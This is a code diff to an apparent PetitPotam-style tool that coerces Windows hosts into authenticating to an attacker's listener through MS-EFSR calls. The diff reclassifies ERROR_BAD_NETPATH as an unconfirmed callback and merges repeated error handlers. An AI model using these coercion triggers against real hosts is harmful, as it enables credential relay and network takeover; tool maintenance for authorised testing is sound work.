@@ -2,7 +2,7 @@
 
 import logging
 
-from bigpotam.methods import check_error
+from bigpotam.methods import UNCONFIRMED, check_error
 from bigpotam.paths import efsr_path
 from bigpotam.structures import (
     EFS_RPC_BLOB,
@@ -23,12 +23,32 @@ from bigpotam.structures import (
 
 log = logging.getLogger("bigpotam")
 
-_SUCCESS_CODES = {0x00000035, 0x0000007B}  # ERROR_BAD_NETPATH, ERROR_INVALID_NAME
-_SUCCESS_STRINGS = ("ERROR_BAD_NETPATH", "ERROR_INVALID_NAME")
+_SUCCESS_CODES = {0x0000007B}  # ERROR_INVALID_NAME
+_SUCCESS_STRINGS = ("ERROR_INVALID_NAME",)
+
+# Hosts with the October 2026 update return ERROR_BAD_NETPATH without
+# connecting out, so it no longer proves a callback (p0dalirius/Coercer#110).
+_UNCONFIRMED_CODES = {0x00000035}  # ERROR_BAD_NETPATH
+_UNCONFIRMED_STRINGS = ("ERROR_BAD_NETPATH",)
 
 
-def _check_success(e):
-    return check_error(e, _SUCCESS_CODES, _SUCCESS_STRINGS)
+def _unconfirmed(name, result):
+    log.warning(
+        "  %s: call returned %s, callback unconfirmed: hosts with the "
+        "October 2026 update return this without connecting",
+        name,
+        result,
+    )
+    return UNCONFIRMED
+
+
+def _check_result(name, e):
+    if check_error(e, _SUCCESS_CODES, _SUCCESS_STRINGS):
+        return True
+    if check_error(e, _UNCONFIRMED_CODES, _UNCONFIRMED_STRINGS):
+        return _unconfirmed(name, "ERROR_BAD_NETPATH")
+    log.debug("%s: %s", name, e)
+    return False
 
 
 def trigger_open_file_raw(dce, listener, listener_port=445, **kw):
@@ -39,10 +59,7 @@ def trigger_open_file_raw(dce, listener, listener_port=445, **kw):
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("EfsRpcOpenFileRaw: %s", e)
-        return False
+        return _check_result("EfsRpcOpenFileRaw", e)
 
 
 def trigger_encrypt_file_srv(dce, listener, listener_port=445, **kw):
@@ -52,10 +69,7 @@ def trigger_encrypt_file_srv(dce, listener, listener_port=445, **kw):
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("EfsRpcEncryptFileSrv: %s", e)
-        return False
+        return _check_result("EfsRpcEncryptFileSrv", e)
 
 
 def trigger_decrypt_file_srv(dce, listener, listener_port=445, **kw):
@@ -66,10 +80,7 @@ def trigger_decrypt_file_srv(dce, listener, listener_port=445, **kw):
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("EfsRpcDecryptFileSrv: %s", e)
-        return False
+        return _check_result("EfsRpcDecryptFileSrv", e)
 
 
 def trigger_query_users_on_file(dce, listener, listener_port=445, **kw):
@@ -79,10 +90,7 @@ def trigger_query_users_on_file(dce, listener, listener_port=445, **kw):
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("EfsRpcQueryUsersOnFile: %s", e)
-        return False
+        return _check_result("EfsRpcQueryUsersOnFile", e)
 
 
 def trigger_query_recovery_agents(dce, listener, listener_port=445, **kw):
@@ -92,10 +100,7 @@ def trigger_query_recovery_agents(dce, listener, listener_port=445, **kw):
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("EfsRpcQueryRecoveryAgents: %s", e)
-        return False
+        return _check_result("EfsRpcQueryRecoveryAgents", e)
 
 
 def trigger_remove_users_from_file(dce, listener, listener_port=445, **kw):
@@ -106,10 +111,7 @@ def trigger_remove_users_from_file(dce, listener, listener_port=445, **kw):
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("EfsRpcRemoveUsersFromFile: %s", e)
-        return False
+        return _check_result("EfsRpcRemoveUsersFromFile", e)
 
 
 def trigger_add_users_to_file(dce, listener, listener_port=445, **kw):
@@ -120,10 +122,7 @@ def trigger_add_users_to_file(dce, listener, listener_port=445, **kw):
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("EfsRpcAddUsersToFile: %s", e)
-        return False
+        return _check_result("EfsRpcAddUsersToFile", e)
 
 
 def trigger_file_key_info(dce, listener, listener_port=445, **kw):
@@ -134,10 +133,7 @@ def trigger_file_key_info(dce, listener, listener_port=445, **kw):
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("EfsRpcFileKeyInfo: %s", e)
-        return False
+        return _check_result("EfsRpcFileKeyInfo", e)
 
 
 def trigger_duplicate_encryption_info_file(dce, listener, listener_port=445, **kw):
@@ -153,10 +149,7 @@ def trigger_duplicate_encryption_info_file(dce, listener, listener_port=445, **k
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("EfsRpcDuplicateEncryptionInfoFile: %s", e)
-        return False
+        return _check_result("EfsRpcDuplicateEncryptionInfoFile", e)
 
 
 def trigger_add_users_to_file_ex(dce, listener, listener_port=445, **kw):
@@ -168,10 +161,7 @@ def trigger_add_users_to_file_ex(dce, listener, listener_port=445, **kw):
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("EfsRpcAddUsersToFileEx: %s", e)
-        return False
+        return _check_result("EfsRpcAddUsersToFileEx", e)
 
 
 def trigger_file_key_info_ex(dce, listener, listener_port=445, **kw):
@@ -184,7 +174,4 @@ def trigger_file_key_info_ex(dce, listener, listener_port=445, **kw):
         dce.request(request)
         return True
     except Exception as e:
-        if _check_success(e):
-            return True
-        log.debug("EfsRpcFileKeyInfoEx: %s", e)
-        return False
+        return _check_result("EfsRpcFileKeyInfoEx", e)
